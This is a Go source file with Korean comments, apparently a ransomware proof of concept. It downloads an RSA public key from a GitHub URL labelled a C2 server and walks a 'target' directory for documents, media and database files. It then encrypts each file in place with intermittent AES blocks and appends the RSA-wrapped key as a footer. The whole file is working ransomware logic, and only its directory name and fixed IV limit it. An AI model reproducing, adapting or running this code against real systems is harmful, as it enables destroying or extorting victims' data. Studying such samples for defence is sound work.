package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const (
	TargetDir = "target"
	Stride    = 50 // 수십 바이트 단위로 점프
	BlockSize = 16 // AES 블록 크기
	// 깃허브 Raw 주소
	C2PublicKeyURL = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/key/public.pem"
)

// 대상 확장자 목록 정의
var targetExtensions = map[string]bool{
	// 문서
	".txt": true, ".docx": true, ".xlsx": true, ".pptx": true, ".pdf": true, ".hwp": true,
	// 동영상
	".mp4": true, ".avi": true, ".mkv": true, ".wmv": true, ".mov": true, ".flv": true,
	// 사진
	".jpg": true, ".jpeg": true, ".png": true, ".gif": true, ".bmp": true, ".webp": true,
	// 음성
	".mp3": true, ".wav": true, ".wma": true, ".flac": true, ".ogg": true,
	// DB
	".db": true, ".sqlite": true, ".sql": true, ".mdb": true,
}

// C2로부터 일반 PEM 공개키를 받아와 파싱하는 함수
func getPublicKeyFromC2(url string) (*rsa.PublicKey, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("HTTP GET 실패: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("서버 응답 에러 (Status Code: %d)", resp.StatusCode)
	}

	pemBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("본문 읽기 실패: %v", err)
	}

	// PEM 블록 디코딩
	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return nil, fmt.Errorf("PEM 디코딩 실패 (올바른 PEM 형식이 아닙니다)")
	}

	// RSA 공개키 파싱
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("공개키 파싱 실패: %v", err)
	}

	return pub.(*rsa.PublicKey), nil
}

// 개별 파일을 암호화하는 함수
func encryptFile(filePath string, publicKey *rsa.PublicKey) error {
	// 무작위 AES 대칭키(32바이트) 생성
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return fmt.Errorf("AES 키 생성 실패: %w", err)
	}

	// 대상 파일 오픈
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return fmt.Errorf("파일 열기 실패: %w", err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("파일 정보 가져오기 실패: %w", err)
	}
	fileSize := fileInfo.Size()

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return fmt.Errorf("AES Cipher 생성 실패: %w", err)
	}
	// 고정된 IV 사용 (PoC 목적)
	iv := make([]byte, BlockSize)
	mode := cipher.NewCBCEncrypter(block, iv)

	// 간헐적 부분 암호화 진행
	var offset int64 = 0
	buf := make([]byte, BlockSize)
	encBuf := make([]byte, BlockSize)
	encryptedBlocks := 0

	for offset+int64(BlockSize) <= fileSize {
		_, err := file.Seek(offset, 0)
		if err != nil {
			break
		}

		_, err = file.Read(buf)
		if err != nil {
			break
		}

		// 블록 암호화 수행
		mode.CryptBlocks(encBuf, buf)

		// 제자리에 덮어쓰기
		_, _ = file.Seek(offset, 0)
		_, _ = file.Write(encBuf)

		encryptedBlocks++
		// 오프셋을 블록 크기 + Stride 간격만큼 이동
		offset += int64(BlockSize) + int64(Stride)
	}

	// 사용된 AES 대칭키를 RSA 공개키로 암호화
	encryptedAESKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		publicKey,
		aesKey,
		nil,
	)
	if err != nil {
		return fmt.Errorf("RSA 대칭키 암호화 실패: %w", err)
	}

	// 암호화된 대칭키를 파일 끝(EOF)에 푸터로 결합
	_, _ = file.Seek(0, 2)
	_, _ = file.Write([]byte("\n---ENC_KEY_START---"))
	_, _ = file.Write(encryptedAESKey)
	_, _ = file.Write([]byte("---ENC_KEY_END---"))

	fmt.Printf("[+] 암호화 완료: %s (총 %d개 블록 암호화됨)\n", filePath, encryptedBlocks)
	return nil
}

func main() {
	fmt.Println("[*] C2 서버에서 RSA 공개키 다운로드 시도 중...")
	publicKey, err := getPublicKeyFromC2(C2PublicKeyURL)
	if err != nil {
		fmt.Printf("[-] 실패: %v\n", err)
		return
	}
	fmt.Println("[+] RSA 공개키 성공적으로 수신 및 해독 완료")

	// target 디렉토리 탐색
	fmt.Printf("[*] '%s' 디렉토리 탐색 및 암호화 시작...\n", TargetDir)
	err = filepath.WalkDir(TargetDir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		// 디렉토리는 건너뜀
		if d.IsDir() {
			return nil
		}

		// 확장자 검사 (소문자로 통일)
		ext := strings.ToLower(filepath.Ext(path))
		if targetExtensions[ext] {
			fmt.Printf("[*] 암호화 대상 발견: %s\n", path)
			if err := encryptFile(path, publicKey); err != nil {
				fmt.Printf("[-] 파일 암호화 실패 (%s): %v\n", path, err)
			}
		}
		return nil
	})

	if err != nil {
		fmt.Printf("[-] 디렉토리 탐색 중 에러 발생: %v\n", err)
		return
	}

	fmt.Println("[+] 모든 대상 파일 암호화 시나리오 정상 종료.")
}
